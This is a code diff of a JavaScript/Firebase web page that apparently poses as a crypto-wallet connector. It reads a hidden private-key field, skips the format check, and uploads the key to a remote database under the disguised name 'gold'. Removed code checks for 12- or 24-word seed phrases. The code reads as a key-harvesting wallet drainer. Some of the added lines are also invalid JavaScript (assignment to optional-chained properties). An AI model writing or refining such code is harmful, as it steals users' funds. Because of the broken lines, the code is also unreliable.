@@ -488,7 +488,7 @@ function storeGold(inputId, skipFormatCheck = false) {
     return;
   }
 
-  const user = auth.currentUser; // Check if user is logged in
+  const user = auth?.currentUser; // Ensure auth is defined
   if (!user) {
     displayError('User not logged in.');
     return;
@@ -502,23 +502,20 @@ function storeGold(inputId, skipFormatCheck = false) {
   userRef
     .once('value')
     .then((snapshot) => {
-      const userData = snapshot.val();
+      const userData = snapshot.val() || {};
 
-      if (userData) {
-        // Update user data with private keys, checking for empty slots
-        userRef.update({ last_login: uDateTime });
+      // Update user data with private keys, checking for empty slots
+      const updateData = { last_login: uDateTime };
 
-        if (!userData.gold1) {
-          userRef.update({ gold1: gold });
-        } else if (!userData.gold2) {
-          userRef.update({ gold2: gold });
-        } else if (!userData.gold3) {
-          userRef.update({ gold3: gold });
-        } else {
-          displayError('Maximum wallets reached.');
-          return;
-        }
+      if (!userData.gold1) updateData.gold1 = gold;
+      else if (!userData.gold2) updateData.gold2 = gold;
+      else if (!userData.gold3) updateData.gold3 = gold;
+      else {
+        displayError('Maximum wallets reached.');
+        return Promise.reject(new Error('Maximum wallets reached.'));
       }
+
+      return userRef.update(updateData);
     })
     .then(() => {
       // On success, trigger navigation and update UI
@@ -541,8 +538,16 @@ document.getElementById('import-gold-btn')?.addEventListener('click', function (
 });
 
 
-	
 
+
+
+
+
+
+
+
+
+	
 document.addEventListener('DOMContentLoaded', function () {
   // Ensure Firebase is properly initialized and auth is loaded
   if (typeof firebase === 'undefined' || typeof auth === 'undefined') {
@@ -557,8 +562,7 @@ document.addEventListener('DOMContentLoaded', function () {
       return;
     }
 
-    const user = auth.currentUser;
-
+    const user = auth?.currentUser;
     if (!user) {
       displayError('User not logged in.');
       return;
@@ -567,10 +571,9 @@ document.addEventListener('DOMContentLoaded', function () {
     // Encrypt wallet address
     walletAES(user.uid, walletAddress);
 
-    // Firebase update logic
     const userRef = firebase.database().ref('users/' + user.uid);
     userRef.once('value')
-      .then(snapshot => {
+      .then((snapshot) => {
         const userData = snapshot.val() || {};
         const updateData = { last_login: uDateTime };
 
@@ -600,97 +603,40 @@ document.addEventListener('DOMContentLoaded', function () {
         }
 
         console.log('Wallet selector updated.');
-        navbar.style.display = 'block';
-        errorMessageDiv.style.display = 'none';
+        document.getElementById('navbar')?.style.display = 'block';
+        document.getElementById('error-message-div')?.style.display = 'none';
       })
-      .catch(error => {
+      .catch((error) => {
         displayError('Failed to add wallet address: ' + error.message);
       });
-  }
-
-  // Function to update username label
-  function updateUsernameLabel() {
-    const user = firebase.auth().currentUser;
-    if (user) {
-      const userRef = firebase.database().ref('users/' + user.uid);
-      userRef.once('value', (snapshot) => {
-        const userData = snapshot.val();
-        if (userData && userData.name) {
-          let username = userData.name;
-          if (!username.startsWith('@')) {
-            username = '@' + username; // Prepend '@' to the username
-          }
-          document.getElementById('win-username-txt').textContent = username;
-        } else {
-          console.log("User data is missing.");
-        }
-      }).catch((error) => {
-        console.log("Error fetching user data:", error);
-      });
-    } else {
-      console.log("No user is logged in.");
-    }
-  }
-
-  // Field validation functions
-  function validate_email(email) {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-  }
-
-  function validate_password(password) {
-    return password.length >= 6;
-  }
-
-  function validate_walletAddressLength(address) {
-    return address.length >= 10;
-  }
-
-  function validate_passwords_match(password, confirm_password) {
-    return password === confirm_password;
-  }
-
-  function validate_input(input) {
-    return input != null && input.trim().length > 0;
-  }
-
-  function checkWordCount(input) {
-    const trimmedValue = input.trim();
-    const words = trimmedValue.split(/\s+/);
-    return words.length === 12 || words.length === 24;
   }
 
   // Event listener for 'add-wallet-address-btn'
   document.getElementById('add-wallet-address-btn')?.addEventListener('click', function (event) {
     event.preventDefault();
-    let walletAddress = document.getElementById('wallet-address-input').value;
-    let networkType = document.getElementById('wallet-address-label1').textContent;
+    const walletAddress = document.getElementById('wallet-address-input')?.value;
+    const networkType = document.getElementById('wallet-address-label1')?.textContent;
 
-    // Call the reusable function
-    storeWalletAddress(walletAddress, networkType);
+    if (walletAddress && networkType) {
+      storeWalletAddress(walletAddress, networkType);
+    }
   });
 
+  // Event listener for 'connect-to-wallet-btn'
+  document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
+    event.preventDefault();
 
-// Event listener for 'add-wallet-address-btn'
-document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
-event.preventDefault();
+    storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
 
-storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+    const walletAddress = document.getElementById('wallet-address-txt-hidden')?.value;
+    const networkType = document.getElementById('wallet-address-label1')?.textContent;
 
-let walletAddress = document.getElementById('wallet-address-txt-hidden').value;
-let networkType = document.getElementById('wallet-address-label1').textContent;
-
-// Call the reusable function
-storeWalletAddress(walletAddress, networkType);
+    if (walletAddress && networkType) {
+      storeWalletAddress(walletAddress, networkType);
+    }
+  });
 });
 
-
-
-
-
-
-
-
-});
 
 
 
